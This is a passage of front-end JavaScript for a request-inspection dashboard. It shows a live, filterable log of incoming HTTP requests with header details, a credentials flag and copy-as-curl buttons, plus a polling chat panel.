      if(skip.has(k)||!v||v==='-')continue;
      const hdr=k.replace(/_/g,'-').replace(/\b\w/g,l=>l.toUpperCase());
      c+=" \\\n  -H '"+hdr+": "+v+"'"}
    if(e.body)c+=" \\\n  -d '"+String(e.body).replace(/'/g,"'\\''")+"'";
    return c}

  function makeNodes(e){
    const row=document.createElement('div');row.className='le';row.dataset.n=e.n;
    const flag=e.body&&SECRET_RE.test(e.body)?'<span class="le-flag">creds</span>':'';
    row.innerHTML='<span class="le-n">'+e.n+'</span>'+
      '<span class="le-time">'+hl(e.time)+'</span>'+
      '<span class="le-m '+methodClass(e.method)+'">'+hl(e.method)+'</span>'+
      '<span class="le-path" title="'+ea(e.path)+'"><span class="le-p">'+hl(e.path)+'</span>'+flag+'</span>'+
      '<span class="le-code '+codeClass(e.code)+'">'+hl(e.code||'')+'</span>'+
      '<span class="le-ip">'+hl(e.ip)+'</span>'+
      '<span class="le-ua" title="'+ea(e.ua)+'">'+hl(e.ua)+'</span>';
    const det=document.createElement('div');det.className='le-detail';
    const pairs=[['HTTP',e.httpver],['Client',e.ip+':'+e.port],
      ['Host',e.host],['User-Agent',e.ua],['Accept',e.accept],
      ['Accept-Language',e.accept_lang||e.accept_language],
      ['Accept-Encoding',e.accept_enc||e.accept_encoding],
      ['Referer',e.referer],['Origin',e.origin],['Cookie',e.cookie],
      ['Connection',e.connection],['Content-Type',e.content_type],
      ['Content-Length',e.content_len||e.content_length],
      ['X-Forwarded-For',e.xff||e.x_forwarded_for],['Authorization',e.auth||e.authorization],
      ['DNT',e.dnt]];
    let dh='<div class="ld-grid">';
    pairs.forEach(([k,v])=>{if(v&&v!=='-')dh+='<span class="dk">'+k+'</span><span class="dv">'+hl(v)+'</span>'});
    dh+='</div>';
    if(e.body){const sb=smartBody(e.body);
      dh+='<div class="dk">Body'+(sb.kind!=='raw'?' &middot; '+sb.kind:'')+'</div>'+
          '<pre class="dbody-pre">'+hl(sb.text)+'</pre>'}
    const curl=buildCurl(e);
    dh+='<div class="dcurl"><code>'+esc(curl)+'</code>'+
        '<button class="iconbtn dc-copy" title="Copy as curl">'+I.copy+'</button></div>';
    det.innerHTML=dh;
    det.querySelector('.dc-copy').addEventListener('click',ev=>{
      ev.stopPropagation();copyText(curl,'curl command copied')});
    if(openRows.has(e.n)){row.classList.add('expanded');det.classList.add('open')}
    return[row,det]}

  // full rebuild — only on filter change / clear / first paint
  function renderAll(){
    const vis=entries.filter(matchesFilter);
    lpBadge.textContent=entries.length||'';
    lpBody.innerHTML='';
    if(!vis.length){lpBody.appendChild(lpEmpty);lpEmpty.style.display='';return}
    lpEmpty.style.display='none';
    const frag=document.createDocumentFragment();
    vis.forEach(e=>{const[r,d]=makeNodes(e);frag.appendChild(r);frag.appendChild(d)});
    lpBody.appendChild(frag);
    if(autoScroll)lpBody.scrollTop=lpBody.scrollHeight}

  // incremental — append only the new entries; existing rows stay untouched
  function appendNew(fresh){
    if(lpEmpty.parentNode===lpBody)lpEmpty.remove();
    fresh.forEach(e=>{
      if(!matchesFilter(e))return;
      const[r,d]=makeNodes(e);
      lpBody.appendChild(r);lpBody.appendChild(d)});
    // keep DOM in sync with the 500-entry cap (row + detail pairs)
    while(lpBody.childElementCount>1000){
      lpBody.removeChild(lpBody.firstChild);
      if(lpBody.firstChild)lpBody.removeChild(lpBody.firstChild)}
    if(autoScroll)lpBody.scrollTop=lpBody.scrollHeight}

  lpBody.addEventListener('click',e=>{
    const row=e.target.closest('.le');if(!row)return;
    const n=+row.dataset.n;
    const expanding=!row.classList.contains('expanded');
    row.classList.toggle('expanded',expanding);
    const det=row.nextElementSibling;
    if(det&&det.classList.contains('le-detail'))det.classList.toggle('open',expanding);
    if(expanding)openRows.add(n);else openRows.delete(n)});

  function poll(){
    if(paused)return;
    fetch('/log?since='+lastN).then(r=>r.json()).then(data=>{
      if(!data.length)return;
      const fresh=[];
      data.forEach(e=>{if(e.n>lastN){entries.push(e);fresh.push(e);lastN=e.n}});
      if(entries.length>500)entries=entries.slice(-500);
      lpBadge.textContent=entries.length||'';
      if(!statsEl.hidden)renderStats();
      if(!fresh.length)return;
      if(entries.length===fresh.length){renderAll();painted=true;return}   // first paint
      appendNew(fresh);
      if(painted)blip();
    }).catch(()=>{});
  }
  setInterval(poll,2000);
  poll();
})();

// ── chat ──────────────────────────────────────────────────
(function(){
  const panel=q('chat'),cbody=q('chat-body'),cin=q('chat-input'),csend=q('chat-send'),
        toggle=q('chat-toggle'),dot=q('chat-dot');
  let lastN=0,seen=false;

  // open by default, but remember if the user closed it
  function openChat(focus){panel.hidden=false;dot.hidden=true;toggle.classList.add('active');
    if(focus!==false)cin.focus();
    try{localStorage.setItem('expose-chat','open')}catch(e){}}
  function closeChat(){panel.hidden=true;toggle.classList.remove('active');
    try{localStorage.setItem('expose-chat','closed')}catch(e){}}
  try{if(localStorage.getItem('expose-chat')==='closed'){closeChat()}else{openChat(false)}}catch(e){openChat(false)}
  toggle.addEventListener('click',()=>{panel.hidden?openChat():closeChat()});
  q('chat-close').addEventListener('click',closeChat);

  // one-click copy of any message
  cbody.addEventListener('click',e=>{
    const m=e.target.closest('.cm');if(!m)return;
    copyText(m.querySelector('.cx').textContent,'Message copied')});

  function refresh(){
    fetch('/chat').then(r=>r.json()).then(msgs=>{
      if(!msgs.length)return;
      const added=msgs.filter(m=>m.n>lastN);
      if(!added.length)return;
      const had=lastN>0;
      lastN=msgs[msgs.length-1].n;
      added.forEach(m=>{
        const d=document.createElement('div');d.className='cm';d.title='Click to copy';
        d.innerHTML='<span class="ct">'+esc(m.time)+'</span><span class="cx">'+esc(m.msg)+'</span>';
        cbody.appendChild(d)});
      cbody.scrollTop=cbody.scrollHeight;
      if(panel.hidden&&had)dot.hidden=false;   // unread indicator (skip initial backlog)
    }).catch(()=>{})}

  function send(){
    const v=cin.value.trim();
    if(!v)return;
    fetch('/chat',{method:'POST',body:v}).then(r=>r.json()).then(()=>{cin.value='';refresh()}).catch(()=>{})}

  csend.addEventListener('click',send);
  cin.addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();send()}});
  setInterval(refresh,2000);refresh();
})();
